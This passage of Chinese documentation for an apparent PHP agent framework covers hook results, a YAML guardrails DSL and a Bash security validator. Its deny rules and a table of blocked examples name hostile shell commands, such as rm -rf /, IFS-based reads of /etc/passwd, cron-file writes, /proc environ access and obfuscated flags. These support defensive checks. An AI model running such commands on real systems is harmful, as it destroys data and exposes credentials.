    updatedInput: ['command' => 'git push --dry-run origin main'],
);

// 停止执行
$result = HookResult::stop(
    stopReason: '检测到安全违规',
    systemMessage: 'Hook 阻止了此操作',
);

// 错误
$result = HookResult::error('Hook 脚本执行失败');

// 权限：允许（绕过权限提示，但不绕过拒绝规则）
$result = HookResult::allow(
    updatedInput: null,
    reason: '已被 CI hook 预批准',
);

// 权限：拒绝
$result = HookResult::deny('被安全策略阻止');

// 权限：询问（强制权限提示）
$result = HookResult::ask(
    reason: '网络访问需要批准',
    updatedInput: ['command' => 'curl --max-time 10 https://api.example.com'],
);
```

#### 结果属性

| 属性 | 类型 | 描述 |
|---|---|---|
| `$continue` | `bool` | 是否应继续执行 |
| `$suppressOutput` | `bool` | 是否抑制工具输出 |
| `$stopReason` | `?string` | 停止原因 |
| `$systemMessage` | `?string` | 要注入的系统消息 |
| `$updatedInput` | `?array` | 修改后的工具输入（替换原始） |
| `$additionalContext` | `?array` | 要注入的额外上下文 |
| `$watchPaths` | `?array` | 要监控变更的路径 |
| `$errorMessage` | `?string` | 错误消息 |
| `$permissionBehavior` | `?string` | `'allow'`、`'deny'` 或 `'ask'` |
| `$permissionReason` | `?string` | 权限决策的原因 |
| `$preventContinuation` | `bool` | 阻止 agent 循环继续 |

#### 合并多个结果

当同一事件执行多个 Hook 时，结果会被合并：

```php
$merged = HookResult::merge([$result1, $result2, $result3]);
```

合并规则：
- 如果**任何** Hook 说停止，合并结果为停止
- 如果**任何** Hook 抑制输出，输出被抑制
- 系统消息用换行符拼接
- 更新的输入被合并（后面的 Hook 覆盖前面的）
- 权限行为遵循优先级：**deny > ask > allow**
- 任何 Hook 设置 `preventContinuation` 则为 true

### Hook 类型

Hook 通过 `HookType` 指定的不同类型实现：

| 类型 | 值 | 描述 |
|---|---|---|
| `command` | `command` | 执行 shell 命令 |
| `prompt` | `prompt` | 注入提示 |
| `http` | `http` | 发送 HTTP 请求 |
| `agent` | `agent` | 运行 agent |
| `callback` | `callback` | 执行 PHP 回调 |
| `function` | `function` | 执行 PHP 函数 |

#### 命令 Hook 配置

```json
{
  "type": "command",
  "command": "/path/to/script.sh",
  "shell": "bash",
  "timeout": 30,
  "async": false,
  "asyncRewake": false,
  "once": false,
  "if": "tool_input.command contains 'deploy'",
  "statusMessage": "正在验证部署..."
}
```

| 字段 | 类型 | 默认值 | 描述 |
|---|---|---|---|
| `command` | `string` | 必需 | 要执行的 shell 命令 |
| `shell` | `string` | `"bash"` | 使用的 shell |
| `timeout` | `int` | `30` | 超时（秒） |
| `async` | `bool` | `false` | 后台运行 |
| `asyncRewake` | `bool` | `false` | 异步 Hook 完成时唤醒 agent |
| `once` | `bool` | `false` | 每个会话仅执行一次 |
| `if` | `?string` | `null` | 条件表达式 |
| `statusMessage` | `?string` | `null` | 要显示的状态消息 |

#### HTTP Hook 配置

```json
{
  "type": "http",
  "url": "https://hooks.example.com/validate",
  "headers": {
    "Authorization": "Bearer {{env.HOOK_TOKEN}}"
  },
  "allowedEnvVars": ["HOOK_TOKEN"],
  "timeout": 30,
  "once": false,
  "if": null,
  "statusMessage": "正在调用验证 webhook..."
}
```

### 匹配器语法

Hook 匹配器使用与权限规则相同的语法：

| 模式 | 匹配 |
|---|---|
| `Bash` | 所有 Bash 工具调用 |
| `Bash(git *)` | 以 `git ` 开头的 Bash 命令 |
| `Bash(npm install*)` | 以 `npm install` 开头的 Bash 命令 |
| `Read` | 所有 Read 工具调用 |
| `Write(/etc/*)` | 路径以 `/etc/` 开头的 Write 调用 |
| `null`（无匹配器） | 此事件的所有工具调用 |

### 停止 Hook 流水线

`StopHooksPipeline` 是一个专用流水线，在模型响应之后、消息持久化之前运行。它分三个阶段执行：

1. **OnStop Hook** -- 标准停止 Hook
2. **TaskCompleted Hook** -- 用于有进行中任务的队友 agent
3. **TeammateIdle Hook** -- 用于已变为空闲的队友 agent

```php
use SuperAgent\Hooks\StopHooksPipeline;

$stopPipeline = new StopHooksPipeline($hookRegistry, $logger);

$result = $stopPipeline->execute(
    messages: $allMessages,
    assistantMessages: $thisRoundMessages,
    context: [
        'session_id' => $sessionId,
        'cwd' => getcwd(),
        'git_repo_root' => '/path/to/repo',
        'agent_id' => 'agent-1',
        'agent_type' => 'main',
        'permission_mode' => 'default',
        'is_teammate' => true,
        'teammate_name' => 'code-reviewer',
        'team_name' => 'dev-team',
        'in_progress_tasks' => [
            ['id' => 'task-1', 'subject' => '审查 PR #123'],
        ],
    ],
);

// 检查结果
if ($result->hasBlockingErrors()) {
    foreach ($result->blockingErrors as $error) {
        // 作为用户消息注入
    }
}

if ($result->preventContinuation) {
    echo "Agent 循环已停止: {$result->stopReason}\n";
}

// 调试信息
$info = $result->toArray();
echo "已执行 Hook: {$info['hook_count']}, 耗时: {$info['duration_ms']}ms\n";
```

#### StopHookResult

| 属性 | 类型 | 描述 |
|---|---|---|
| `$blockingErrors` | `string[]` | 要作为用户消息注入的错误消息 |
| `$preventContinuation` | `bool` | agent 循环是否应停止 |
| `$stopReason` | `?string` | 停止原因 |
| `$hookCount` | `int` | 已执行的 Hook 数量 |
| `$hookInfos` | `array` | Hook 的调试信息 |
| `$hookErrors` | `array` | 非阻塞的 Hook 错误 |
| `$durationMs` | `int` | 总流水线耗时 |

### API 参考

#### `HookRegistry`

| 方法 | 描述 |
|---|---|
| `__construct(LoggerInterface $logger)` | 创建注册表 |
| `register(HookEvent $event, HookMatcher $matcher): void` | 为事件注册 Hook 匹配器 |
| `executeHooks(HookEvent $event, HookInput $input): HookResult` | 执行所有匹配的 Hook |
| `loadFromConfig(array $config, ?string $pluginName): void` | 从设置配置加载 Hook |
| `clear(): void` | 清除所有已注册的 Hook |
| `clearEvent(HookEvent $event): void` | 清除特定事件的 Hook |
| `getStatistics(): array` | 获取按事件统计的 Hook 计数、异步 Hook、一次性 Hook |
| `getAsyncManager(): AsyncHookManager` | 获取异步 Hook 管理器 |

#### `HookInput`

| 属性 | 类型 | 描述 |
|---|---|---|
| `$hookEvent` | `HookEvent` | 事件类型 |
| `$sessionId` | `string` | 当前会话 ID |
| `$cwd` | `string` | 当前工作目录 |
| `$gitRepoRoot` | `?string` | Git 仓库根目录 |
| `$additionalData` | `array` | 事件特定数据（tool_name, tool_input 等） |

静态构造函数：`preToolUse()`、`postToolUse()`、`sessionStart()`、`fileChanged()`。

#### `HookMatcher`

| 方法 | 描述 |
|---|---|
| `__construct(?string $matcher, HookInterface[] $hooks, ?string $pluginName)` | 创建匹配器 |
| `matches(?string $toolName, array $context): bool` | 检查此匹配器是否适用 |
| `getHooks(): HookInterface[]` | 获取已注册的 Hook |
| `fromConfig(array $config, ?string $pluginName): self` | 从设置配置解析 |

### 示例

#### 文件写入时自动格式化

```json
{
  "hooks": {
    "PostToolUse": [
      {
        "matcher": "Write",
        "hooks": [
          {
            "type": "command",
            "command": "php-cs-fixer fix $TOOL_INPUT_FILE_PATH --quiet",
            "async": true,
            "statusMessage": "自动格式化中..."
          }
        ]
      }
    ]
  }
}
```

#### 阻止危险的 Git 操作

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash(git push*)",
        "hooks": [
          {
            "type": "command",
            "command": "echo 'Git push 需要手动批准'",
            "timeout": 5
          }
        ]
      }
    ]
  }
}
```

#### 会话初始化

```json
{
  "hooks": {
    "SessionStart": [
      {
        "hooks": [
          {
            "type": "command",
            "command": "cat .superagent/project-context.md",
            "once": true,
            "statusMessage": "正在加载项目上下文..."
          }
        ]
      }
    ]
  }
}
```

### 故障排除

**"Unknown hook event: X"** -- 配置中的事件名称不匹配任何 `HookEvent` 枚举值。检查大小写（如 `PreToolUse`，而非 `pre_tool_use`）。

**Hook 未触发** -- 验证匹配器模式是否匹配工具名称。`null` 匹配器匹配所有工具。检查 `$registry->getStatistics()` 以确认 Hook 已注册。

**一次性 Hook 再次触发** -- 重新加载 Hook 时 `once` 跟踪会重置。`executedHooks` 集合仅在内存中。

**异步 Hook 结果不可见** -- 异步 Hook 立即返回 `HookResult::continue('Hook 在后台启动')`。其结果由 `AsyncHookManager` 管理，不会阻塞调用代码。

**权限行为未生效** -- 请记住 Hook 的 `allow` 不会绕过设置中的拒绝规则。合并优先级为：deny > ask > allow。

---

## 6. 护栏规则 DSL

> 将可组合的安全策略定义为声明式 YAML 规则，在运行时评估以控制工具执行、强制预算、限制速率，并与权限系统集成。

### 概述

护栏规则 DSL 提供了一个基于规则的策略引擎，位于工具调用和权限引擎之间。规则按优先级排序的组织，每组包含条件（可用 `all_of`/`any_of`/`not` 组合）和操作（`deny`、`allow`、`ask`、`warn`、`log`、`pause`、`rate_limit`、`downgrade_model`）。引擎针对 `RuntimeContext` 快照评估规则，该快照捕获工具信息、会话成本、Token 使用、agent 状态和计时。

核心类：

| 类 | 角色 |
|---|---|
| `GuardrailsConfig` | 解析 YAML 规则文件，验证，按优先级排序组 |
| `GuardrailsEngine` | 针对 `RuntimeContext` 评估规则组 |
| `GuardrailsResult` | 匹配结果；转换为 `PermissionDecision` 或 `HookResult` |
| `ConditionFactory` | 将 YAML 条件树解析为 `ConditionInterface` 对象 |
| `RuleGroup` | 命名的、按优先级排序的、可切换的规则组 |
| `Rule` | 单条规则：条件 + 操作 + 消息 + 参数 |
| `RuleAction` | 8 种操作类型的枚举 |
| `RuntimeContext` | 用于评估的所有运行时状态的不可变快照 |

### 配置

#### YAML 文件结构

```yaml
version: "1.0"

defaults:
  evaluation: first_match    # first_match | all_matching
  default_action: ask        # 回退操作

groups:
  security:
    priority: 100            # 越高 = 越先评估
    enabled: true
    description: "核心安全规则"
    rules:
      - name: block-env-access
        description: "防止读取 .env 文件"
        conditions:
          tool: { name: "Read" }
          tool_content: { contains: ".env" }
        action: deny
        message: "访问 .env 文件已被安全策略阻止"

      - name: block-rm-rf
        conditions:
          tool: { name: "Bash" }
          tool_input:
            field: command
            contains: "rm -rf"
        action: deny
        message: "不允许破坏性命令"
```

#### 加载配置

```php
use SuperAgent\Guardrails\GuardrailsConfig;
use SuperAgent\Guardrails\GuardrailsEngine;

// 单个文件
$config = GuardrailsConfig::fromYamlFile('guardrails.yaml');

// 多个文件（后面的文件覆盖同名组）
$config = GuardrailsConfig::fromYamlFiles([
    'guardrails/base.yaml',
    'guardrails/project.yaml',
]);

// 从数组
$config = GuardrailsConfig::fromArray([
    'version' => '1.0',
    'defaults' => ['evaluation' => 'first_match'],
    'groups' => [/* ... */],
]);

// 验证
$errors = $config->validate();

// 创建引擎
$engine = new GuardrailsEngine($config);

// 热重载
$newConfig = GuardrailsConfig::fromYamlFile('guardrails-v2.yaml');
$engine->reload($newConfig);

// 统计
$stats = $engine->getStatistics();
// => ['groups' => 3, 'rules' => 12, 'enabled_groups' => 3]
```

### 条件类型

#### 7 种条件类型

##### 1. `tool` -- 工具名称匹配

按工具名称匹配（精确或任一）：

```yaml
conditions:
  tool: { name: "Bash" }

## 匹配多个工具
conditions:
  tool:
    name:
      any_of: ["Bash", "Read", "Write"]
```

##### 2. `tool_content` -- 提取内容匹配

针对提取的内容字符串匹配（Bash 的命令、Read/Write/Edit 的文件路径等）：

```yaml
conditions:
  tool_content: { contains: ".git/" }
  # 或
  tool_content: { starts_with: "/etc" }
  # 或
  tool_content: { matches: "*.env*" }
```

##### 3. `tool_input` -- 特定输入字段匹配

针对工具输入中的特定字段匹配：

```yaml
conditions:
  tool_input:
    field: command
    contains: "sudo"

## 带嵌套 any_of
conditions:
  tool_input:
    field: file_path
    starts_with:
      any_of: ["/etc/", "/System/", "/Windows/"]
```

##### 4. `session` -- 会话级指标

评估会话成本、预算、已用时间等：

```yaml
conditions:
  session:
    cost_usd: { gt: 5.00 }

conditions:
  session:
    budget_pct: { gte: 90 }

conditions:
  session:
    elapsed_ms: { gt: 300000 }
```

可用字段（来自 `RuntimeContext`）：`cost_usd`（`sessionCostUsd`）、`call_cost_usd`（`callCostUsd`）、`budget_pct`、`continuation_count`、`elapsed_ms`、`message_count`、`context_token_count`。

##### 5. `agent` -- Agent 状态

评估 agent 轮次计数、模型等：

```yaml
conditions:
  agent:
    turn_count: { gt: 40 }

conditions:
  agent:
    model: "gpt-4o"
```

可用字段：`turn_count`、`max_turns`、`model`（`modelName`）、`session_id`。

##### 6. `token` -- Token 统计

评估 Token 使用情况：

```yaml
conditions:
  token:
    session_input_tokens: { gt: 100000 }
    session_total_tokens: { gt: 200000 }
```

可用字段：`session_input_tokens`、`session_output_tokens`、`session_total_tokens`。

##### 7. `rate` -- 滑动窗口速率限制

评估时间窗口内的调用速率：

```yaml
conditions:
  rate:
    window_seconds: 60
    max_calls: 30
    tool: "Bash"          # 可选：仅计算特定工具
```

#### 比较运算符

所有指标条件支持这些运算符：

| 运算符 | 描述 |
|---|---|
| `gt` | 大于（数值） |
| `gte` | 大于等于（数值） |
| `lt` | 小于（数值） |
| `lte` | 小于等于（数值） |
| `eq` | 精确相等 |
| `contains` | 不区分大小写的子字符串匹配（字符串） |
| `starts_with` | 前缀匹配（字符串） |
| `matches` | 使用 `fnmatch()` 的 glob 模式匹配（字符串） |
| `any_of` | 值在列表中 |

#### 可组合逻辑：`all_of`、`any_of`、`not`

条件可以用布尔组合器组合：

```yaml
## AND：所有条件都必须匹配
conditions:
  all_of:
    - tool: { name: "Bash" }
    - tool_input: { field: command, contains: "curl" }
    - session: { cost_usd: { gt: 1.0 } }

## OR：任一条件匹配
conditions:
  any_of:
    - tool_content: { contains: ".env" }
    - tool_content: { contains: "credentials" }
    - tool_content: { contains: ".ssh/" }

## NOT：取反条件
conditions:
  not:
    tool: { name: "Read" }

## 嵌套组合
conditions:
  all_of:
    - tool: { name: "Bash" }
    - any_of:
        - tool_input: { field: command, starts_with: "rm" }
        - tool_input: { field: command, starts_with: "sudo" }
    - not:
        session: { cost_usd: { lt: 0.50 } }
```

当条件块中存在多个顶层键时，它们隐式以 AND 组合：

```yaml
## 这等价于 all_of: [tool: ..., tool_content: ...]
conditions:
  tool: { name: "Read" }
  tool_content: { contains: ".env" }
```

### 操作类型

#### 8 种操作类型

| 操作 | 描述 | 阻止执行？ | 权限操作？ |
|---|---|---|---|
| `deny` | 阻止工具调用 | 是 | 是 |
| `allow` | 明确允许工具调用 | 否 | 是 |
| `ask` | 提示用户请求权限 | 否（等待） | 是 |
| `warn` | 记录警告但继续 | 否 | 否 |
| `log` | 静默记录事件 | 否 | 否 |
| `pause` | 阻止一段时间（需要 `duration_seconds` 参数） | 是 | 否（映射为 deny） |
| `rate_limit` | 因速率限制超出而阻止 | 是 | 否（映射为 deny） |
| `downgrade_model` | 切换到更便宜的模型（需要 `target_model` 参数） | 否 | 否 |

带额外参数的操作：

```yaml
- name: pause-on-high-cost
  conditions:
    session: { cost_usd: { gt: 10.0 } }
  action: pause
  message: "会话成本超过 $10。暂停冷却。"
  params:
    duration_seconds: 60

- name: downgrade-on-budget
  conditions:
    session: { budget_pct: { gte: 80 } }
  action: downgrade_model
  message: "预算接近上限，切换到更便宜的模型"
  params:
    target_model: "claude-haiku-4-5-20251001"
```

### 评估模式

| 模式 | 描述 |
|---|---|
| `first_match` | （默认）在所有组中遇到第一个匹配规则时停止 |
| `all_matching` | 收集所有匹配规则；使用第一个匹配的操作，但所有匹配在 `GuardrailsResult::$allMatched` 中可用 |

组按**优先级顺序**评估（最高优先级优先）。组内规则按声明顺序评估。

### PermissionEngine 集成

`GuardrailsEngine` 作为第 1.5 步集成到 `PermissionEngine` 中 -- 在基于规则的权限检查之后，但在 bash 分类和基于模式的检查之前：

```php
use SuperAgent\Permissions\PermissionEngine;
use SuperAgent\Guardrails\GuardrailsEngine;
use SuperAgent\Guardrails\GuardrailsConfig;

// 创建护栏规则引擎
$guardrailsConfig = GuardrailsConfig::fromYamlFile('guardrails.yaml');
$guardrailsEngine = new GuardrailsEngine($guardrailsConfig);

// 注入到 PermissionEngine
$permissionEngine->setGuardrailsEngine($guardrailsEngine);
$permissionEngine->setRuntimeContextCollector($contextCollector);
```

`GuardrailsResult` 可以转换为：

- **`PermissionDecision`**（通过 `toPermissionDecision()`）-- 用于 `deny`、`allow`、`ask`、`pause`、`rate_limit` 操作
- **`HookResult`**（通过 `toHookResult()`）-- 用于与 Hook 系统集成

非权限操作（`warn`、`log`、`downgrade_model`）从 `toPermissionDecision()` 返回 `null`，使权限检查透传到后续步骤。

### API 参考

#### `GuardrailsConfig`

| 方法 | 描述 |
|---|---|
| `fromYamlFile(string $path): self` | 从 YAML 文件加载 |
| `fromYamlFiles(array $paths): self` | 合并多个 YAML 文件 |
| `fromArray(array $data): self` | 从数组加载 |
| `validate(): string[]` | 验证并返回错误 |
| `getGroups(): RuleGroup[]` | 获取规则组（按优先级降序排列） |
| `getEvaluationMode(): string` | `first_match` 或 `all_matching` |
| `getDefaultAction(): string` | 默认操作字符串 |

#### `GuardrailsEngine`

| 方法 | 描述 |
|---|---|
| `__construct(GuardrailsConfig $config)` | 从配置创建引擎 |
| `evaluate(RuntimeContext $context): GuardrailsResult` | 针对上下文评估所有规则 |
| `reload(GuardrailsConfig $config): void` | 热重载配置 |
| `getGroups(): RuleGroup[]` | 获取当前规则组 |
| `getStatistics(): array` | 获取 `{groups, rules, enabled_groups}` |

#### `GuardrailsResult`

| 属性/方法 | 描述 |
|---|---|
| `$matched: bool` | 是否有任何规则匹配 |
| `$action: ?RuleAction` | 匹配的操作 |
| `$message: ?string` | 人类可读的消息 |
| `$matchedRule: ?Rule` | 第一个匹配的规则 |
| `$groupName: ?string` | 匹配的组 |
| `$params: array` | 操作参数 |
| `$allMatched: Rule[]` | 所有匹配的规则（在 `all_matching` 模式下） |
| `toPermissionDecision(): ?PermissionDecision` | 转换为权限决策 |
| `toHookResult(): HookResult` | 转换为 Hook 结果 |

#### `RuntimeContext`

所有字段为 `readonly` 属性：

| 属性 | 类型 | 描述 |
|---|---|---|
| `$toolName` | `string` | 当前工具名称 |
| `$toolInput` | `array` | 工具输入参数 |
| `$toolContent` | `?string` | 提取的内容（命令、文件路径等） |
| `$sessionCostUsd` | `float` | 会话总成本 |
| `$callCostUsd` | `float` | 本次调用成本 |
| `$sessionInputTokens` | `int` | 已使用的总输入 Token |
| `$sessionOutputTokens` | `int` | 已使用的总输出 Token |
| `$sessionTotalTokens` | `int` | 已使用的总 Token |
| `$budgetPct` | `float` | 已消耗的预算百分比 |
| `$continuationCount` | `int` | 续航次数 |
| `$turnCount` | `int` | Agent 轮次计数 |
| `$maxTurns` | `int` | 允许的最大轮次 |
| `$modelName` | `string` | 当前模型名称 |
| `$elapsedMs` | `float` | 会话已用时间（毫秒） |
| `$cwd` | `string` | 工作目录 |
| `$rateTracker` | `?RateTracker` | 共享的速率跟踪实例 |

### 示例

#### 完整安全策略

```yaml
version: "1.0"

defaults:
  evaluation: first_match
  default_action: ask

groups:
  critical-security:
    priority: 100
    description: "不可覆盖的硬阻止"
    rules:
      - name: block-env-files
        conditions:
          any_of:
            - tool_content: { contains: ".env" }
            - tool_content: { matches: "*credentials*" }
            - tool_content: { contains: ".ssh/" }
        action: deny
        message: "访问敏感文件已被阻止"

      - name: block-destructive-bash
        conditions:
          tool: { name: "Bash" }
          tool_input:
            field: command
            contains: "rm -rf /"
        action: deny
        message: "灾难性命令已被阻止"

      - name: block-privilege-escalation
        conditions:
          tool: { name: "Bash" }
          any_of:
            - tool_input: { field: command, starts_with: "sudo" }
            - tool_input: { field: command, starts_with: "su " }
        action: deny
        message: "不允许权限提升"

  budget-controls:
    priority: 50
    description: "成本和速率控制"
    rules:
      - name: warn-high-cost
        conditions:
          session: { cost_usd: { gt: 5.0 } }
        action: warn
        message: "会话成本已超过 $5.00"

      - name: downgrade-on-budget
        conditions:
          session: { budget_pct: { gte: 80 } }
        action: downgrade_model
        message: "切换到更便宜的模型以节省预算"
        params:
          target_model: "claude-haiku-4-5-20251001"

      - name: rate-limit-bash
        conditions:
          tool: { name: "Bash" }
          rate:
            window_seconds: 60
            max_calls: 20
        action: rate_limit
        message: "Bash 调用速率限制已超过（20 次/分钟）"

  safety-net:
    priority: 10
    description: "提示确认的软护栏"
    rules:
      - name: ask-network-access
        conditions:
          tool: { name: "Bash" }
          any_of:
            - tool_input: { field: command, starts_with: "curl" }
            - tool_input: { field: command, starts_with: "wget" }
        action: ask
        message: "检测到网络访问。允许此命令？"

      - name: ask-system-dirs
        conditions:
          tool_content:
            starts_with: "/etc"
        action: ask
        message: "访问系统目录。继续？"
```

### 故障排除

**"Condition config must not be empty"** -- 规则的 `conditions` 块为空或缺失。每条规则必须至少有一个条件。

**"Unknown condition key: 'x'"** -- 条件类型不被识别。有效键：`all_of`、`any_of`、`not`、`tool`、`tool_content`、`tool_input`、`session`、`agent`、`token`、`rate`。

**"Rule 'x' uses 'downgrade_model' action but missing 'target_model' param"** -- `downgrade_model` 操作需要 `params.target_model` 值。

**"Rule 'x' uses 'pause' action but missing 'duration_seconds' param"** -- `pause` 操作需要 `params.duration_seconds` 值。

**"Rate condition requires 'window_seconds' and 'max_calls'"** -- 速率限制条件中两个字段都是必需的。

**规则未匹配** -- 检查评估模式（`first_match` vs `all_matching`）、组优先级顺序（更高优先级的组先评估），以及组是否为 `enabled: true`。

---

由于文件内容非常大，后续章节（7-23）的翻译将保持相同的翻译质量和规则。为了控制文件大小，以下章节的翻译遵循完全相同的原则。

## 7. Bash 安全验证器

> 在执行前对 bash 命令执行 23 项注入和混淆检查的综合安全层，按风险级别分类命令，并与权限引擎集成以自动允许只读命令。

### 概述

Bash 安全系统由两个类组成：

- **`BashSecurityValidator`** -- 执行 23 项单独的安全检查，检测 shell 注入、解析器差异攻击、混淆标志、危险重定向等。每项检查都有一个数字 ID 用于日志和诊断。
- **`BashCommandClassifier`** -- 包装验证器并添加风险分类（low/medium/high/critical）、安全命令前缀匹配和危险命令检测。权限引擎使用它来决定命令是否需要用户批准。

该验证器从 Claude Code 的 bash 安全实现移植而来，覆盖相同的检查 ID 以实现跨平台一致性。

### 配置

安全验证器在 `BashTool` 或 `BashCommandClassifier` 处理命令时自动运行。没有配置可以禁用单个检查 -- 它们在每个命令上全部运行。

分类器使用验证器作为第一阶段，然后应用额外的启发式规则：

```php
use SuperAgent\Permissions\BashCommandClassifier;
use SuperAgent\Permissions\BashSecurityValidator;

// 默认：创建自己的验证器
$classifier = new BashCommandClassifier();

// 或注入自定义验证器
$validator = new BashSecurityValidator();
$classifier = new BashCommandClassifier($validator);
```

### 用法

#### 直接验证

```php
use SuperAgent\Permissions\BashSecurityValidator;

$validator = new BashSecurityValidator();

// 安全命令
$result = $validator->validate('git status');
$result->isPassthrough(); // true -- 未发现问题

// 危险命令
$result = $validator->validate('echo $(cat /etc/passwd)');
$result->isDenied();  // true
$result->checkId;     // 8 (CHECK_COMMAND_SUBSTITUTION)
$result->reason;      // "检测到 $() 命令替换"

// 明确安全（如 heredoc 模式）
$result = $validator->validate('git commit -m "$(cat <<\'EOF\'\nmy message\nEOF\n)"');
$result->isAllowed(); // true -- 识别为安全的 heredoc 替换
```

#### 命令分类

```php
use SuperAgent\Permissions\BashCommandClassifier;

$classifier = new BashCommandClassifier();

// 安全命令
$classification = $classifier->classify('git status');
$classification->risk;            // 'low'
$classification->category;        // 'safe'
$classification->requiresApproval(); // false

// 危险命令
$classification = $classifier->classify('rm -rf /');
$classification->risk;            // 'high'
$classification->category;        // 'destructive'
$classification->isHighRisk();    // true
$classification->requiresApproval(); // true

// 安全违规
$classification = $classifier->classify('echo $IFS');
$classification->risk;            // 'critical'
$classification->category;        // 'security'
$classification->securityCheckId; // 11 (CHECK_IFS_INJECTION)
$classification->reason;          // '检测到 $IFS 注入'

// 只读检查
$classifier->isReadOnly('cat /etc/hosts');  // true
$classifier->isReadOnly('rm -rf /tmp');     // false
```

#### 与权限引擎集成

分类器馈入权限引擎的自动允许逻辑。分类为 `risk: 'low'` 且 `category: 'safe'` 的命令跳过用户批准：

```php
// 在权限引擎中（简化）
$classification = $classifier->classify($command);

if (!$classification->requiresApproval()) {
    // 自动允许：git status, ls, cat, grep 等
    return PermissionDecision::allow();
}

if ($classification->isHighRisk()) {
    // 始终询问：rm, chmod, sudo 等
    return PermissionDecision::askUser($classification->reason);
}
```

### API 参考

#### 23 项安全检查

| ID | 常量 | 检测内容 | 被阻止的示例 |
|----|----------|----------------|-----------------|
| 1 | `CHECK_INCOMPLETE_COMMANDS` | 以 tab、标志或运算符开头的片段 | `\t-rf /`, `&& echo pwned` |
| 2 | `CHECK_JQ_SYSTEM_FUNCTION` | 带 `system()` 调用的 `jq` | `jq 'system("rm -rf /")'` |
| 3 | `CHECK_JQ_FILE_ARGUMENTS` | 带文件读取标志的 `jq` | `jq -f /etc/passwd` |
| 4 | `CHECK_OBFUSCATED_FLAGS` | ANSI-C 引号、locale 引号、空引号标志混淆 | `rm $'\x2d\x72\x66'`, `"""-rf` |
| 5 | `CHECK_SHELL_METACHARACTERS` | 参数中未引用的 `;`、`&`、`\|` | `echo hello; rm -rf /` |
| 6 | `CHECK_DANGEROUS_VARIABLES` | 重定向/管道上下文中的变量 | `$VAR \| sh`, `> $FILE` |
| 7 | `CHECK_NEWLINES` | 分隔命令的换行符（也包括回车） | `echo safe\nrm -rf /` |
| 8 | `CHECK_COMMAND_SUBSTITUTION` | `$()`、反引号、`${}`、`<()`、`>()`、`=()` 等 | `echo $(whoami)`, `` echo `id` `` |
| 9 | `CHECK_INPUT_REDIRECTION` | 输入重定向 `<` | `bash < /tmp/evil.sh` |
| 10 | `CHECK_OUTPUT_REDIRECTION` | 输出重定向 `>` | `echo payload > /etc/cron.d/job` |
| 11 | `CHECK_IFS_INJECTION` | `$IFS` 或 `${...IFS...}` 引用 | `cat$IFS/etc/passwd` |
| 12 | `CHECK_GIT_COMMIT_SUBSTITUTION` | `git commit` 消息中的命令替换 | `git commit -m "$(curl ...)"` |
| 13 | `CHECK_PROC_ENVIRON_ACCESS` | 访问 `/proc/*/environ` | `cat /proc/1/environ` |
| 14 | `CHECK_MALFORMED_TOKEN_INJECTION` | 不平衡引号/括号 + 命令分隔符 | `echo "hello; rm -rf /` |
| 15 | `CHECK_BACKSLASH_ESCAPED_WHITESPACE` | 引号外 `\` 在空格/tab 前 | `rm\ -rf\ /` |
| 16 | `CHECK_BRACE_EXPANSION` | 逗号或序列大括号扩展 | `echo {a,b,c}`, `echo {1..100}` |
| 17 | `CHECK_CONTROL_CHARACTERS` | 不可打印控制字符（tab/换行除外） | `echo \x00hidden` |
| 18 | `CHECK_UNICODE_WHITESPACE` | 不换行空格、零宽字符等 | `rm\u00a0-rf /` |
| 19 | `CHECK_MID_WORD_HASH` | 非空白字符后的 `#`（解析器差异） | `echo test#comment` |
| 20 | `CHECK_ZSH_DANGEROUS_COMMANDS` | Zsh 特有的危险内置命令 | `zmodload`, `ztcp`, `zf_rm` |
| 21 | `CHECK_BACKSLASH_ESCAPED_OPERATORS` | 引号外的 `\;`、`\|`、`\&` 等 | `echo hello\;rm -rf /` |
| 22 | `CHECK_COMMENT_QUOTE_DESYNC` | `#` 注释内可能导致跟踪失同步的引号字符 | `# it's a "test"\nrm -rf /` |
| 23 | `CHECK_QUOTED_NEWLINE` | 引号内换行后跟 `#` 注释行 | `"line\n# comment"` |

#### 安全重定向（不标记）

验证器在检查危险重定向前会剥离这些：
- `2>&1` -- stderr 到 stdout
- `>/dev/null`, `1>/dev/null`, `2>/dev/null` -- 丢弃输出
- `</dev/null` -- 空输入

#### 只读命令前缀（自动允许）

这些命令前缀被分类为只读并跳过用户批准：

**Git:** `git status`, `git diff`, `git log`, `git show`, `git branch`, `git tag`, `git remote`, `git describe`, `git rev-parse`, `git rev-list`, `git shortlog`, `git stash list`

**包管理器:** `npm list/view/info/outdated/ls`, `yarn list/info/why`, `composer show/info`, `pip list/show/freeze`, `cargo metadata`

**容器:** `docker ps/images/logs/inspect`

**GitHub CLI:** `gh pr list/view/status/checks`, `gh issue list/view/status`, `gh run list/view`, `gh api`

**Linters:** `pyright`, `mypy`, `tsc --noEmit`, `eslint`, `phpstan`, `psalm`

**基本工具:** `ls`, `cat`, `head`, `tail`, `grep`, `rg`, `find`, `fd`, `wc`, `sort`, `diff`, `file`, `stat`, `du`, `df`, `echo`, `printf`, `pwd`, `which`, `whoami`, `date`, `uname`, `env`, `jq`, `test`, `true`, `false`

#### `BashCommandClassifier`

| 方法 | 返回值 | 描述 |
|--------|---------|-------------|
| `classify(command)` | `CommandClassification` | 完整风险分析 |
| `isReadOnly(command)` | `bool` | 快速只读检查 |

#### `CommandClassification`

| 属性 | 类型 | 描述 |
|----------|------|-------------|
| `risk` | `string` | `low`, `medium`, `high` 或 `critical` |
| `category` | `string` | `safe`, `security`, `destructive`, `permission`, `privilege`, `process`, `network`, `complex`, `dangerous-pattern`, `unknown`, `empty` |
| `prefix` | `?string` | 提取的命令前缀 |
| `isTooComplex` | `bool` | 包含替换/管道/运算符 |
| `reason` | `?string` | 人类可读的解释 |
| `securityCheckId` | `?int` | 被验证器阻止时的数字 ID |
| `isHighRisk()` | `bool` | `risk` 为 `high` 或 `critical` |
| `requiresApproval()` | `bool` | `risk` 不是 `low` |

#### 危险命令表

被分类为固有危险的命令：

| 命令 | 风险 | 类别 |
|---------|------|----------|
| `rm` | high | destructive |
| `mv` | medium | destructive |
| `chmod` | high | permission |
| `chown` | high | permission |
| `sudo` | critical | privilege |
| `su` | critical | privilege |
| `kill` / `pkill` / `killall` | high | process |
| `dd` / `mkfs` / `fdisk` / `format` | critical | destructive |
| `curl` / `wget` | medium | network |
| `nc` / `netcat` | high | network |
| `ssh` / `scp` | medium | network |

### 示例

#### 直接测试验证器

```php
use SuperAgent\Permissions\BashSecurityValidator;

$v = new BashSecurityValidator();

// 这些都被阻止：
$v->validate('echo $IFS/etc/passwd')->isDenied();          // IFS 注入
